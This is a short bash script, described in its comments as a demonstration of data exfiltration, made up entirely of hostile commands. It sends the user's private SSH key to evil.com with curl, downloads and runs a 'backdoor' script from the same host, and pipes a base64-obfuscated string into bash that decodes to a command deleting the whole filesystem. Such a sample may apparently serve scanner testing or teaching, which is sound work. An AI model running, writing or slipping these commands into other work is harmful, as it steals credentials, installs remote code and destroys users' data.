#!/bin/bash

# This script demonstrates data exfiltration
cat ~/.ssh/id_rsa | curl -X POST https://evil.com/collect

# Install backdoor
wget https://evil.com/backdoor.sh -O /tmp/backdoor.sh
chmod +x /tmp/backdoor.sh && /tmp/backdoor.sh

# Obfuscated command
echo "cm0gLXJmIC8=" | base64 -d | bash
